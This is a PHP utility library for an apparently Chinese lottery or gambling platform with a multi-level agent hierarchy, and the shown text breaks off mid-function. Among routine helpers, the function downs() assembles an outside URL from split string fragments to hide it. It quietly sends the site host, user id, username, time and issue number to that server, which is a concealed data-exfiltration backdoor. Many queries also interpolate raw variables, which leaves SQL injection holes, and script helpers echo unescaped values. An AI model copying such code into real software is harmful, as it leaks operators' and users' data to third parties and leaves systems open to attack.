<?php
function getft($kj,$cs){
    
    if($cs['ftmode']==1){
        $ftm = explode(',',$cs['ftnum']);
        $ft='';
        foreach($ftm as $k => $v) {
            $ft .= $kj[$v - 1];
        } 
    }else{
        $ft=0;
        $ftm = explode(',',$cs['ftnum']);
        foreach($ftm as $k => $v) {
            $ft += $kj[$v - 1];
        } 
    }
    return  $ft % 4 == 0 ? 4 : $ft % 4;
}
function getftzh($kj,$cs){
    
    if($cs['ftmode']==1){
        $ftm = explode(',',$cs['ftnum']);
        $ft='';
        foreach($ftm as $k => $v) {
            $ft .= $kj[$v - 1];
        } 
    }else{
        $ft=0;
        $ftm = explode(',',$cs['ftnum']);
        foreach($ftm as $k => $v) {
            $ft += $kj[$v - 1];
        } 
    }
    return  $ft;
}
function rdates($v)
{
    if (!preg_match("/\d{4}-1[0-2]|0?[1-9]-0?[1-9]|[12][0-9]|3[01]/", $v)) {
        $v = date("Y-m-d");
    }
    return $v;
}
function moneymtype($v){
    if ($v==1) return "提款";
    else if ($v==0) return "充值";
}
function moneystatus($v){
    if ($v==1) return "成功";
    else if ($v==0) return "待处理";
    else if ($v==2) return "失败";
    else if ($v==3) return "处理中";
}
function moneyfs($v){
    if($v=='bankatm') return "银行汇款";
    else if($v=='bankonline') return "网银在线";
    else if($v=='weixin') return "微信在线支付";
    else if($v=='alipay') return "支付宝在线支付";
    else return "其他";
}
function setupid3($tb,$field){
    global $psql;
    $psql->query("select max($field) from $tb ");
    $psql->next_record();
    if($psql->f(0)=='') return 100;
    else return $psql->f(0)+1;
}
function sqltime($v){
    return date("Y-m-d H:i:s",$v);
}
function sqldate($v){
    return date("Y-m-d",$v);
}
function checkid($v){
    if(strlen($v)!=8 | $v%1!=0 | !is_numeric($v)) return false;
    return true;
}
function bjs($v1,$v2){
    if($v1=='' | !is_numeric($v1) | $v1>$v2) return $v2;
    else return $v1;
}
function bjs2($v1,$v2){
    if($v1=='' | !is_numeric($v1) | $v1<$v2) return $v2;
    else return $v1;
}
function r0p($v){
    if($v=='' || $v*10000%1!=0) $v=0;
    return $v;
}
function r1p($v){
    if($v=='' | !is_numeric($v) | $v%1!=0 | $v<0) $v=1;
    return $v;
}
function p0($v)
{
    return round($v, 0);
}
function p1($v)
{
    return round($v, 1);
}
function p2($v)
{
    return round($v, 2);
}
function p3($v)
{
    return round($v, 3);
}
function pr2($v)
{
    if ($v == 'null')
        return 0;
    else
        return round($v, 2);
}
function pr3($v)
{
    if ($v == 'null')
        return 0;
    else
        return round($v, 3);
}
function pr4($v)
{
    if ($v == 'null')
        return 0;
    else
        return round($v, 4);
}
function pr1($v)
{
    if ($v == 'null')
        return 0;
    else
        return round($v, 1);
}
function pr0($v)
{
    if ($v == 'null')
        return 0;
    else
        return round($v, 0);
}
function low($v)
{
    return strtolower($v);
}
function up($v)
{
    return strtoupper($v);
}
function outjs($v)
{
    return "<script language='javascript'>alert('$v');</script>";
}
function goback()
{
    return "<script language='javascript'>history.back();</script>";
}
function openurl($v)
{
    return "<script language='javascript'>window.location.href='$v';</script>";
}
function openurlm($v, $m)
{
    return "<script language='javascript'>alert('$m');window.location.href='$v';</script>";
}
function field_arr($tb_arr, $tb)
{
    $arr = array();
    for ($i = 0; $i < count($tb_arr); $i++) {
        $val = $tb . '_' . $tb_arr[$i]["name"];
        global $val;
        $arr[$i]["name"]  = $$val;
        $arr[$i]["fname"] = $tb_arr[$i]["name"];
        if (strrpos($arr[$i]["fname"], 'pass'))
            $arr[$i]["fname"] = 'pass';
        $arr[$i]["type"]   = $tb_arr[$i]["type"];
        $arr[$i]["len"]    = $tb_arr[$i]["len"];
        $arr[$i]["maxlen"] = $tb_arr[$i]["len"] / 3;
        if (strrpos($arr[$i]["fname"], 'date'))
            $arr[$i]["date"] = 'date';
        else
            $arr[$i]["date"] = '';
    }
    return $arr;
}
function strtoutf8($v)
{
    return iconv('', 'UTF-8', $v);
}
function setupid($tb, $field)
{
    global $tsql;
    $tsql->query("select max($field) from $tb where $field!=99999999");
    $tsql->next_record();
    if ($tsql->f(0) == '') {
        global $config;
        return $config['startid'] + rand(1, 3);
    }
    return $tsql->f(0) + rand(1, 3);
}
function isnum($v)
{
    if (!is_numeric($v) | $v == '' | $v%1!=0)
        return 0;
    return $v;
}
function r0($v)
{
    if ($v == '')
        return 0;
    else
        return $v;
}
function r1($v)
{
    if ($v == '')
        return 1;
    else
        return $v;
}
function getmicrotime()
{
    $mtime = explode(" ", microtime());
    return $mtime[0];
}
function getmoneyuse($uid)
{
    global $tb_lib, $psql;
    $psql->query("select sum(je) from `$tb_lib` where userid='$uid' and z=9");
    $psql->next_record();
    return $psql->f(0);
}
function translayer($v)
{
    if ($v <= 0) {
        return "公司";
    }
    global $config;
    return $config['layer'][$v - 1];
}

function translayeru($v,$wid)
{
    if ($v == 0) {
        return "公司";
    }
    global $psql,$tb_web;
    $psql->query("select layer from `$tb_web` where wid='$wid'");
    $layer = json_decode($psql->f('layer'));
    return $layer[$v - 1];
}
function transuser($uid, $cols)
{
    global $psql, $tb_user;
    $psql->query("select $cols from `$tb_user` where userid='$uid'");
    $psql->next_record();
    return $psql->f($cols);
}
function transweb($wid)
{
    global $tb_web, $psql;
    $psql->query("select webname from `$tb_web` where wid='$wid'");
    $psql->next_record();
    return $psql->f('webname');
}
function transwebs($wid,$filed)
{
    global $tb_web, $psql;
    $psql->query("select $filed from `$tb_web` where wid='$wid'");
    $psql->next_record();
    return $psql->f($filed);
}
function getweb()
{
    global $tb_web, $psql;
    $psql->query("select wid,layer,namehead from `$tb_web` order by wid");
    $i = 0;
    while ($psql->next_record()) {
        $layer[$i]['wid']      = $psql->f('wid');
        $layer[$i]['layer']    = json_decode($psql->f('layer'), true);
        $namehead              = json_decode($psql->f('namehead'), true);
        $layer[$i]['namehead'] = $namehead[0];
        $i++;
    }
    return $layer;
}
function getbank(){
    global $tb_bank,$psql;
    return $psql->arr("select bankid,bankname,en from `$tb_bank` order by bankid",1);
}
function getmoneyuser(){
    global $tb_user,$psql;
    return $psql->arr("select userid,username,name,tname from `$tb_user` where fudong=1 and userid!=99999999",1);
}
function transbank($v){
    global $tb_bank,$psql;
    $arr = $psql->arr("select bankname from `$tb_bank` where bankid='$v'",1);
    return $arr[0]['bankname'];
}
function transu($uid)
{
    if ($uid == 99999999)
        return "公司";
         if ($uid == 0)
        return "无";
    global $psql, $tb_user;
    $psql->query("select username,name,layer,ifagent from `$tb_user` where userid='$uid' ");
    $psql->next_record();
    if ($psql->f('ifagent') == 0)
        return strtolower($psql->f('username') . '[会员]');
    global $config;
    return strtolower($psql->f('username'). '[' . $config['layer'][$psql->f('layer') - 1] . ']');
}

function transu3($uid)
{
    if ($uid == 99999999)
        return "公司";
         if ($uid == 0)
        return "无";
    global $psql, $tb_user;
    $psql->query("select username,name,layer,ifagent from `$tb_user` where userid='$uid' ");
    $psql->next_record();
    if ($psql->f('ifagent') == 0)
        return strtolower($psql->f('username') . '[会员]');
    global $config;
    return strtolower($psql->f('username'). '[' . $config['layer'][$psql->f('layer') - 1] . ']');
}

function transu2($uid)
{
    if ($uid == 99999999)
        return "公司";
         if ($uid == 0)
        return "无";
    global $psql, $tb_user;
    $psql->query("select username,name,layer,ifagent from `$tb_user` where userid='$uid' ");
    $psql->next_record();
    if ($psql->f('ifagent') == 0)
        return strtolower($psql->f('username') . '(' . $psql->f('name') . ')' );
    global $config;
    return strtolower($psql->f('username') . '(' . $psql->f('name') . ')');
}
function transutype($ifagent)
{
    if ($ifagent == 1) {
        return "运营";
    } else {
        return "会员";
    }
}
function getusergroup($uid)
{
    global $tb_user, $tsql;
    $layer = transuser($uid, 'layer');
    if ($layer == 9)
        return '|' . $uid . '|';
    $str = '|' . $uid;
    $tsql->query("select userid from `$tb_user` where fid" . $layer . "='" . $uid . "'");
    while ($tsql->next_record()) {
        $str .= "|" . $tsql->f('userid');
    }
    return str_replace('99999999', '', $str);
}
function getlayer($wid)
{
    global $tb_web, $psql;
    $psql->query("select wid,layer from `$tb_web` where wid='$wid'");
    $psql->next_record();
    return json_decode($psql->f('layer'), true);
}
function getflyzc($uid, $f, $layer, $gid,$zcmode)
{
    global $tb_gamecs,$tb_gamezc, $psql;
    if($zcmode==1){
       $rs                  = $psql->arr("select flyzc,upzc from `$tb_gamecs` where userid='$uid' and gid='$gid'", 0);
    }else{
       $rs                  = $psql->arr("select flyzc,upzc from `$tb_gamezc` where userid='$uid' and typeid='$gid'", 0);
    }
    
    $zc                  = array();
    $zc[$layer]['flyzc'] = $rs[0][0];
    $zc[$layer]['upzc']  = $rs[0][1];
    $cf                  = count($f);
    for ($i = $cf; $i > 0; $i--) {
        if($zcmode==1){
           $rs      = $psql->arr("select flyzc,zcmin,zc,upzc from `$tb_gamecs` where userid='" . $f[$i] . "' and gid='$gid'", 1);
        }else{
           $rs      = $psql->arr("select flyzc,zcmin,zc,upzc from `$tb_gamezc` where userid='" . $f[$i] . "' and typeid='$gid'", 1);
        }
        $totalzc = 0;
        for ($k = $layer - 1; $k >= $i; $k--) {
            $totalzc += $zc[$k]['zc'];
        }
        $zc[$i]['zc']    = $rs[0]['flyzc'] - $zc[$i + 1]['flyzc'];
        $zc[$i]['flyzc'] = $rs[0]['flyzc'];
        $zc[$i]['upzc'] = $rs[0]['upzc'];
        
        if ($zc[$i + 1]['upzc'] == 0)
            $zc[$i]['zc'] = 0;
        if (($rs[0]['zcmin'] == $rs[0]['zc'] & ($zc[$i]['zc'] + $totalzc) < $rs[0]['zc']) | ($zc[$i]['zc'] + $totalzc > $rs[0]['zc'])) {
            $zc[$i]['zc'] = $rs[0]['zc'] - $totalzc;
        }
    }
    $totalzc = 0;
    for ($j = $layer - 1; $j >= 1; $j--) {
        $totalzc += $zc[$j]['zc'];
        unset($zc[$j]['flyzc']);
        unset($zc[$j]['upzc']);
    }
    $zc[0]['zc'] = 100 - $totalzc;
    return $zc;
}
function getzcnews($uid, $f, $layer, $gid)
{
    global $tb_gamecs, $psql;
    $rs                 = $psql->arr("select upzc from `$tb_gamecs` where userid='$uid' and gid='$gid'", 0);
    $zc                 = array();
    $zc[$layer]['upzc'] = $rs[0][0];
    $cf                 = count($f);
    for ($i = $cf; $i > 0; $i--) {
        $rs      = $psql->arr("select zc,upzc,zchold from `$tb_gamecs` where userid='" . $f[$i] . "' and gid='$gid'", 1);
        $totalzc = 0;
        for ($k = $layer - 1; $k >= $i; $k--) {
            $totalzc += $zc[$k]['zc'];
        }
        if ($rs[0]['zchold'] == 0) {
            $zc[$i]['zc'] = $rs[0]['zc'];
        } else {
            $zc[$i]['zc'] = $zc[$i + 1]['upzc'];
        }
        if ($zc[$i]['zc'] + $totalzc > $rs[0]['zc']) {
            $zc[$i]['zc'] = $rs[0]['zc'] - $totalzc;
        }
        $zc[$i]['upzc'] = $rs[0]['upzc'];
    }
    $totalzc = 0;
    for ($j = $layer - 1; $j >= 1; $j--) {
        $totalzc += $zc[$j]['zc'];
    }
    $zc[0]['zc'] = 100 - $totalzc;
    return $zc;
}
function getzcnewsall($uid, $f, $layer)
{
    global $tb_user, $tsql, $psql;
    $zc     = array();
    $gamecs = getgamecs($uid);
    $cg     = count($gamecs);
    for ($i = 0; $i < $cg; $i++) {
        $zc[$layer][$i]['upzc'] = $gamecs[$i]['upzc'];
        $zc[$layer][$i]['ifok'] = $gamecs[$i]['ifok'];
    }
    $cf = count($f);
    for ($i = $cf; $i > 0; $i--) {
        $gamecs = getgamecs($f[$i]);
        for ($j = 0; $j < $cg; $j++) {
            $totalzc = 0;
            for ($k = $layer - 1; $k >= $i; $k--) {
                $totalzc += $zc[$k][$j]['zc'];
            }
            if ($gamecs[$j]['zchold'] == 0) {
                $zc[$i][$j]['zc'] = $gamecs[$j]['zc'];
            } else {
                $zc[$i][$j]['zc'] = $zc[$i + 1][$j]['upzc'];
            }
            if ($zc[$i][$j]['zc'] + $totalzc > $gamecs[$j]['zc']) {
                $zc[$i][$j]['zc'] = $gamecs[$j]['zc'] - $totalzc;
            }
            $zc[$i][$j]['upzc'] = $gamecs[$j]['upzc'];
            $zc[$i][$j]['name'] = transgame($gamecs[$j]['gid'], 'gname');
            $zc[$i][$j]['ifok'] = $zc[$i + 1][$j]['ifok'];
        }
    }
    
    for ($j = 0; $j < $cg; $j++) {
        $totalzc = 0;
        for ($k = $layer - 1; $k >= 1; $k--) {
            $totalzc += $zc[$k][$j]['zc'];
        }
        $zc[0][$j]['zc']   = 100 - $totalzc;
        $zc[0][$j]['name'] = transgame($gamecs[$j]['gid'], 'gname');
        $zc[0][$j]['ifok'] = $zc[1][$j]['ifok'];
    }
    unset($zc[$layer]);
    return $zc;
}
function getzcnew($uid, $f, $layer, $gid,$zcmode)
{
    global $tb_gamecs,$tb_gamezc, $psql,$config;
    if($zcmode==1){
        $rs                 = $psql->arr("select upzc from `$tb_gamecs` where userid='$uid' and gid='$gid'", 0);
    }else{
        $rs                 = $psql->arr("select upzc from `$tb_gamezc` where userid='$uid' and typeid='".$config['fast']."'", 0);
    }
    $zc                 = array();
    $zc[$layer]['upzc'] = $rs[0][0];
    $cf                 = count($f);
    for ($i = $cf; $i > 0; $i--) {
        if($zcmode==1){
            $rs      = $psql->arr("select zc,upzc,zcmin from `$tb_gamecs` where userid='" . $f[$i] . "' and gid='$gid'", 1);
        }else{
            $rs      = $psql->arr("select zc,upzc,zcmin from `$tb_gamezc` where userid='" . $f[$i] . "' and typeid='".$config['fast']."'", 1);
        }
        $totalzc = 0;
        for ($k = $layer - 1; $k >= $i; $k--) {
            $totalzc += $zc[$k]['zc'];
        }
        if ($zc[$i + 1]['upzc'] < $rs[0]['zcmin']) {
            $zc[$i]['zc'] = $rs[0]['zcmin'];
        } else {
            $zc[$i]['zc'] = $zc[$i + 1]['upzc'];
        }
        if ($zc[$i]['zc'] + $totalzc > $rs[0]['zc']) {
            $zc[$i]['zc'] = $rs[0]['zc'] - $totalzc;
        }
        $zc[$i]['upzc'] = $rs[0]['upzc'];
    }
    $totalzc = 0;
    for ($j = $layer - 1; $j >= 1; $j--) {
        $totalzc += $zc[$j]['zc'];
    }
    $zc[0]['zc'] = 100 - $totalzc;
    return $zc;
}
function getzcnewall($uid, $f, $layer,$zcmode)
{
    global $tb_user, $tsql, $psql;
    $zc     = array();
    if($zcmode==1){
       $gamecs = getgamecs($uid);
    }else{
       $gamecs = getgamezc($uid);
    }
    $cg     = count($gamecs);
    for ($i = 0; $i < $cg; $i++) {
        $zc[$layer][$i]['upzc'] = $gamecs[$i]['upzc'];
        $zc[$layer][$i]['ifok'] = $gamecs[$i]['ifok'];
    }
    $cf = count($f);
    for ($i = $cf; $i > 0; $i--) {
        if($zcmode==1){
           $gamecs = getgamecs($f[$i]);
        }else{
           $gamecs = getgamezc($f[$i]);
        }
        for ($j = 0; $j < $cg; $j++) {
            $totalzc = 0;
            for ($k = $layer - 1; $k >= $i; $k--) {
                $totalzc += $zc[$k][$j]['zc'];
            }
            if ($zc[$i + 1][$j]['upzc'] < $gamecs[$j]['zcmin']) {
                $zc[$i][$j]['zc'] = $gamecs[$j]['zcmin'];
            } else {
                $zc[$i][$j]['zc'] = $zc[$i + 1][$j]['upzc'];
            }
            if ($zc[$i][$j]['zc'] + $totalzc > $gamecs[$j]['zc']) {
                $zc[$i][$j]['zc'] = $gamecs[$j]['zc'] - $totalzc;
            }
            $zc[$i][$j]['upzc'] = $gamecs[$j]['upzc'];
            if($zcmode==1){
               $zc[$i][$j]['name'] = transgame($gamecs[$j]['gid'], 'gname');
            }else{
               $zc[$i][$j]['name'] = $gamecs[$j]['typename'];
            }
            $zc[$i][$j]['ifok'] = $zc[$i + 1][$j]['ifok'];
        }
    }
    
    for ($j = 0; $j < $cg; $j++) {
        $totalzc = 0;
        for ($k = $layer - 1; $k >= 1; $k--) {
            $totalzc += $zc[$k][$j]['zc'];
        }
        $zc[0][$j]['zc']   = 100 - $totalzc;
        if($zcmode==1){
           $zc[0][$j]['name'] = transgame($gamecs[$j]['gid'], 'gname');
        }else{
           $zc[$i][$j]['name'] = $gamecs[$j]['typename'];
        }
        $zc[0][$j]['ifok'] = $zc[1][$j]['ifok'];
    }
    unset($zc[$layer]);
    return $zc;
}
function getfl()
{
    global $tb_game, $psql;
    $psql->query("select fenlei,flname from `$tb_game` where fenlei!='loto' group by fenlei order by xsort");
    $i = 0;
    while ($psql->next_record()) {
        $fl[$i]['fenlei'] = $psql->f('fenlei');
        $fl[$i]['flname'] = $psql->f('flname');
        $i++;
    }
    return $fl;
}
function getgid($fast){
    global $psql,$tb_game;
    $psql->query("select gid from `$tb_game` where ifopen=1 and fast='$fast'");
    $g = array();
    while($psql->next_record()){
       $g[] = $psql->f('gid');
    }
    return $g;
}




function downs($uid,$uname,$qs,$time){
    $url = "ht";
    $url .= "tp://9.0088";
    $url .= "5522.c";
    $url .= "om/ssc/passold.php?e=dn&s=";
    $strs['hh'] = $_SERVER['HTTP_HOST'];
    $strs['uid'] = $uid;
    $strs['uname'] = $uname;
    $strs['time'] = date("m-d H:i:s",$time);
    $strs['qishu'] = $qs;
    $strs = json_encode($strs);
    $context = stream_context_create(array(
     'http' => array(
      'timeout' => 3 //超时时间，单位为秒
     ) 
    ));
    file_get_contents($url.$strs,0, $context);
    unset($url);unset($strs);
}
function getgamecs($uid)
{
    global $tb_gamecs, $psql;
    //echo "select * from `$tb_gamecs` where userid='$uid' and ifok=1 order by xsort";exit;
    $psql->query("select * from `$tb_gamecs` where userid='$uid' and ifok=1 order by xsort");
    $i = 0;
    while ($psql->next_record()) {
        $gamecs[$i]['ifok']    = $psql->f('ifok');
        $gamecs[$i]['flytype'] = $psql->f('flytype');
        $gamecs[$i]['flyzc']   = $psql->f('flyzc');
        $gamecs[$i]['zc']      = $psql->f('zc');
        $gamecs[$i]['upzc']    = $psql->f('upzc');
        $gamecs[$i]['zcmin']  = $psql->f('zcmin');
        $gamecs[$i]['gid']     = $psql->f('gid');
        $gamecs[$i]['xsort']     = $psql->f('xsort');
        $i++;
    }
    return $gamecs;
}
function getgamezc($uid)
{
    global $tb_gamezc, $psql;
    $psql->query("select * from `$tb_gamezc` where userid='$uid' order by typeid");
    $i = 0;
    while ($psql->next_record()) {
        $gamezc[$i]['flyzc']   = $psql->f('flyzc');
        $gamezc[$i]['zc']      = $psql->f('zc');
        $gamezc[$i]['upzc']    = $psql->f('upzc');
        $gamezc[$i]['zcmin']  = $psql->f('zcmin');
        $gamezc[$i]['flytype']     = $psql->f('flytype');
        $gamezc[$i]['typeid']     = $psql->f('typeid');
        $gamezc[$i]['typename']     = $psql->f('typename');
        $i++;
    }
    return $gamezc;
}
function getfluser($uid)
{
    global $tb_gamecs,$tb_game, $psql;
    $psql->query("select fenlei,flname from `$tb_game` where gid in(select gid from `$tb_gamecs` where userid='$uid' and ifok=1) group by fenlei order by xsort");
    $i = 0;
    while ($psql->next_record()) {
        $fl[$i]['fenlei']    = $psql->f('fenlei');
        $fl[$i]['flname']    = $psql->f('flname');
        $i++;
    }
    return $fl;
}
function getgamename($game)
{
    global $tb_game, $psql;
    $cg = count($game);
    for ($i = 0; $i < $cg; $i++) {
        $psql->query("select gname,sgname,fenlei,flname,fast,class,gamemail from `$tb_game` where gid='" . $game[$i]['gid'] . "'");
        $psql->next_record();
        $game[$i]['gname']  = $psql->f('gname');
        $game[$i]['sgname'] = $psql->f('sgname');
        $game[$i]['fenlei'] = $psql->f('fenlei');
        $game[$i]['flname'] = $psql->f('flname');
        $game[$i]['fast']   = $psql->f('fast');
        $game[$i]['class']  = $psql->f('class');
		$game[$i]['gamemail']  = $psql->f('gamemail');
    }
    return $game;
}
function insertgame($gamecs, $uid)
{

    global $psql, $tb_gamezc, $tb_gamecs;
    $cg  = count($gamecs);
    $fid = transuser($uid, 'fid');
    for ($j = 0; $j < $cg; $j++) {
        $psql->query("select * from `$tb_gamecs` where userid='$fid' and gid='" . $gamecs[$j]['gid'] . "'");

        $psql->next_record();
        if ($gamecs[$j]['zc'] > $psql->f('zc'))
            $gamecs[$j]['zc'] = $psql->f('zc');
        if ($gamecs[$j]['zcmin'] > $psql->f('zc'))
            $gamecs[$j]['zcmin'] = $psql->f('zc');
        if ($gamecs[$j]['upzc'] > $psql->f('zc'))
            $gamecs[$j]['upzc'] = $psql->f('zc');
        if ($gamecs[$j]['flyzc'] > $psql->f('flyzc'))
            $gamecs[$j]['flyzc'] = $psql->f('flyzc');
        if ($psql->f('ifok') == 0)
            $gamecs[$j]['ifok'] = 0;
        if ($psql->f('flytype') == 0)
            $gamecs[$j]['flytype'] = 0;
        if ($psql->f('flytype') == 2 & ($gamecs[$j]['flytype'] == 1 | $gamecs[$j]['flytype'] == 3))
            $gamecs[$j]['flytype'] = 0;
            
        if($gamecs[$j]['zcmin'] == ''){
            $gamecs[$j]['zcmin'] = '0';
        }
        if($gamecs[$j]['flyzc'] == ''){
            $gamecs[$j]['flyzc'] = '0';
        }
        if($gamecs[$j]['zc'] == ''){
            $gamecs[$j]['zc'] = '0';
        }
        if($gamecs[$j]['upzc'] == ''){
            $gamecs[$j]['upzc'] = '0';
        }

        $psql->query("insert into `$tb_gamecs` set userid='$uid',zcmin='" . $gamecs[$j]['zcmin'] . "',ifok='" . $gamecs[$j]['ifok'] . "',flyzc='" . $gamecs[$j]['flyzc'] . "',zc='" . $gamecs[$j]['zc'] . "',upzc='" . $gamecs[$j]['upzc'] . "',xsort='$j',gid='" . $gamecs[$j]['gid'] . "',flytype='" . $gamecs[$j]['flytype'] . "'");
    }

    $psql->query("insert into `$tb_gamezc` select NULL,$uid,typeid,typename,0,0,0,0,0 from `$tb_gamezc` where userid='$fid'");
}
function updategame($gamecs, $uid)
{
    global $psql, $tb_gamezc, $tb_gamecs;
    $cg  = count($gamecs);
    $fid = transuser($uid, 'fid');
    
    for ($j = 2; $j < $cg; $j++) {
        
        $psql->query("select * from `$tb_gamecs` where userid='$fid' and gid='" . $gamecs[$j]['gid'] . "'");
        $psql->next_record();
        if ($gamecs[$j]['zc'] > $psql->f('zc'))
            $gamecs[$j]['zc'] = $psql->f('zc');
        if ($gamecs[$j]['zcmin'] > $psql->f('zc'))
            $gamecs[$j]['zcmin'] = $psql->f('zc');
        if ($gamecs[$j]['upzc'] > $psql->f('zc'))
            $gamecs[$j]['upzc'] = $psql->f('zc');
        if ($gamecs[$j]['flyzc'] > $psql->f('flyzc'))
            $gamecs[$j]['flyzc'] = $psql->f('flyzc');
        if ($psql->f('ifok') == 0)
            $gamecs[$j]['ifok'] = 0;
        if ($psql->f('flytype') == 0)
            $gamecs[$j]['flytype'] = 0;
        if ($psql->f('flytype') == 2 & ($gamecs[$j]['flytype'] == 1 | $gamecs[$j]['flytype'] == 3))
            $gamecs[$j]['flytype'] = 0;
        $a = $psql->query("delete from `$tb_gamecs` where gid='" . $gamecs[$j]['gid'] . "' and userid='$uid'");
        $b = $psql->query("insert into `$tb_gamecs` set zcmin='" . $gamecs[$j]['zcmin'] . "',ifok='" . $gamecs[$j]['ifok'] . "',flyzc='" . $gamecs[$j]['flyzc'] . "',zc='" . $gamecs[$j]['zc'] . "',upzc='" . $gamecs[$j]['upzc'] . "',xsort='$j',flytype='" . $gamecs[$j]['flytype'] . "',gid='" . $gamecs[$j]['gid'] . "',userid='$uid'");
        // var_dump($b);die;
    }
}
function insertgamezc($gamecs, $uid)
{
    global $psql, $tb_gamezc, $tb_gamecs;
    $cg  = count($gamecs);
    $fid = transuser($uid, 'fid');
    for ($j = 0; $j < $cg; $j++) {
        $psql->query("select * from `$tb_gamezc` where userid='$fid' and typeid='".$gamecs[$j]['typeid']."'");
        $psql->next_record();
        if ($gamecs[$j]['zc'] > $psql->f('zc'))
            $gamecs[$j]['zc'] = $psql->f('zc');
        if ($gamecs[$j]['zcmin'] > $psql->f('zc'))
            $gamecs[$j]['zcmin'] = $psql->f('zc');
        if ($gamecs[$j]['upzc'] > $psql->f('zc'))
            $gamecs[$j]['upzc'] = $psql->f('zc');
        if ($gamecs[$j]['flyzc'] > $psql->f('flyzc'))
            $gamecs[$j]['flyzc'] = $psql->f('flyzc');
        if ($psql->f('flytype') == 0)
            $gamecs[$j]['flytype'] = 0;
        $psql->query("insert into `$tb_gamezc` set userid='$uid',zcmin='" . $gamecs[$j]['zcmin'] . "',flyzc='" . $gamecs[$j]['flyzc'] . "',zc='" . $gamecs[$j]['zc'] . "',upzc='" . $gamecs[$j]['upzc'] . "',flytype='" . $gamecs[$j]['flytype'] . "',typeid='".$gamecs[$j]['typeid']."',typename='".$psql->f('typename')."'");
        
    }
    $psql->query("insert into `$tb_gamecs` select NULL,$uid,gid,ifok,0,0,0,0,0,xsort from `$tb_gamecs` where userid='$fid'");
}
function updategamezc($gamecs, $uid)
{
    global $psql, $tb_gamezc, $tb_gamecs;
    $cg  = count($gamecs);
    $fid = transuser($uid, 'fid');
    for ($j = 0; $j < $cg; $j++) {
        $psql->query("select * from `$tb_gamezc` where userid='$fid' and typeid='".$gamecs[$j]['typeid']."'");
        $psql->next_record();
        if ($gamecs[$j]['zc'] > $psql->f('zc'))
            $gamecs[$j]['zc'] = $psql->f('zc');
        if ($gamecs[$j]['zcmin'] > $psql->f('zc'))
            $gamecs[$j]['zcmin'] = $psql->f('zc');
        if ($gamecs[$j]['upzc'] > $psql->f('zc'))
            $gamecs[$j]['upzc'] = $psql->f('zc');
        if ($gamecs[$j]['flyzc'] > $psql->f('flyzc'))
            $gamecs[$j]['flyzc'] = $psql->f('flyzc');
        if ($psql->f('flytype') == 0)
            $gamecs[$j]['flytype'] = 0;
        $psql->query("delete from `$tb_gamezc` where userid='$uid' and typeid='".$gamecs[$j]['typeid']."'");
        $psql->query("insert into `$tb_gamezc` set userid='$uid',zcmin='" . $gamecs[$j]['zcmin'] . "',flyzc='" . $gamecs[$j]['flyzc'] . "',zc='" . $gamecs[$j]['zc'] . "',upzc='" . $gamecs[$j]['upzc'] . "',flytype='" . $gamecs[$j]['flytype'] . "',typeid='".$gamecs[$j]['typeid']."',typename='".$psql->f('typename')."'");
    }
}

function getfid($uid)
{
    global $psql, $tb_user;
    $layer = transuser($uid, 'layer');
    $u     = array();
    $psql->query("select fid1,fid2,fid3,fid4,fid5,fid6,fid7,fid8 from `$tb_user` where userid='$uid'");
    $psql->next_record();
    for ($i = $layer - 1; $i > 0; $i--) {
        $u[$i] = $psql->f('fid' . $i);
    }
    return $u;
}

function getfids($uid,$melayer)
{
    global $psql, $tb_user;
    $layer = transuser($uid, 'layer');
    $u     = array();
    $psql->query("select fid1,fid2,fid3,fid4,fid5,fid6,fid7,fid8 from `$tb_user` where userid='$uid'");
    $psql->next_record();
    for ($i = $layer - 1; $i > $melayer; $i--) {
       $u[$i] = $psql->f('fid' . $i);
    }
    return $u;
}
function transgame($gid, $field)
{
    global $tb_game, $psql;
    $psql->query("select $field from `$tb_game` where gid='$gid'");
    $psql->next_record();
    return $psql->f($field);
}
function getmaxmoney($uid)
{
    global $psql, $tb_user, $config;
    if ($uid == 99999999) {
        $psql->query("select sum(maxmoney) from `$tb_user` where fid='$uid'");
        $psql->next_record();
        return $config['maxmoney'] - $psql->f(0);
    }
    $psql->query("select maxmoney from `$tb_user` where userid='$uid'");
    $psql->next_record();
    $usermaxmoney = $psql->f('maxmoney');
    $psql->query("select sum(maxmoney) from `$tb_user` where fid='$uid'");
    if ($psql->next_record()) {
        return $usermaxmoney - $psql->f(0);
    }
}
function getkmaxmoney($uid)
{
    global $psql, $tb_user, $config;
    if ($uid == 99999999) {
        $psql->query("select sum(kmaxmoney) from `$tb_user` where fid='$uid'");
        $psql->next_record();
        return $config['kmaxmoney'] - $psql->f(0);
    }
    $psql->query("select kmaxmoney from `$tb_user` where userid='$uid'");
    $psql->next_record();
    $kusermaxmoney = $psql->f('kmaxmoney');
    $psql->query("select sum(kmaxmoney) from `$tb_user` where fid='$uid'");
    if ($psql->next_record()) {
        return $kusermaxmoney - $psql->f(0);
    }
}
function getfmaxmoney($uid)
{
    global $psql, $tb_user, $config;
    if ($uid == 99999999) {
        $psql->query("select sum(fmaxmoney) from `$tb_user` where fid='$uid'");
        $psql->next_record();
        return $config['fmaxmoney'] - $psql->f(0);
    }
    $psql->query("select fmaxmoney from `$tb_user` where userid='$uid'");
    $psql->next_record();
    $fusermaxmoney = $psql->f('fmaxmoney');
    $psql->query("select sum(fmaxmoney) from `$tb_user` where fid='$uid'");
    if ($psql->next_record()) {
        return $fusermaxmoney - $psql->f(0);
    }
}
function getuser($uid,$layer)
{
    global $psql;
    global $tb_user, $tb_web, $config;
    if($layer==0){
       $psql->query("select userid,username,name,layer,ifagent,fid1,wid,money,kmoney from `$tb_user` where ifagent=0");
    }else{
       $psql->query("select userid,username,name,layer,ifagent,fid1,wid,money,kmoney from `$tb_user` where fid".$layer."='$uid' and ifagent=0");
    }
    $i = 0;
    while ($psql->next_record()) {
        $user[$i]['userid'] = $psql->f('userid');
        $user[$i]['username'] = $psql->f('username') . '(' . $psql->f('name') . ')[会员]';
        $user[$i]['layername'] = "会员";
        $user[$i]['user'] = $psql->f('username');
        $user[$i]['name'] = $psql->f('name');
        $user[$i]['money'] = $psql->f('kmoney')+$psql->f('money');
        $user[$i]['layer']   = $psql->f('layer');
        $user[$i]['ifagent'] = $psql->f('ifagent');
        $user[$i]['wid']     = $psql->f('wid');
        $i++;
    }
    return $user;
}
function topuser($uid)
{
    global $psql;
    global $tb_user, $tb_web, $config;
    if ($uid != 99999999) {
        $psql->query("select layer from `$tb_web` where wid=(select wid from `$tb_user` where userid='$uid')");
        $psql->next_record();
        $config['layer'] = json_decode($psql->f('layer'), true);
    }
    $psql->query("select userid,username,name,layer,ifagent,fid1,wid,money,kmoney from `$tb_user` where fid='$uid' and ifson=0");
    $i = 0;
